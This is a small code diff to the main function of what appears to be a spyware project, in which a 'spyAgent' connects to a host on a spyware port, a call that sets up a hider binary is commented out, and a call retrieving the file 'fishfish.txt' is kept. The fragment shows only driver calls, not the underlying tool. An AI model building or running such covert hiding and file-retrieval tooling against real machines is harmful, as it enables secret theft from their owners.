@@ -20,9 +20,9 @@ def main():
     targetHiderPath = "./sentHider.o"
 
     spyAgent = Agent(HOST, PORT_SPYWARE)
-
-    print(spyAgent.hider_setup(targetHiderPath))
     print(spyAgent.retrieve_file("fishfish.txt"))
+
+    # print(spyAgent.hider_setup(targetHiderPath))
 
 
 if __name__ == "__main__":
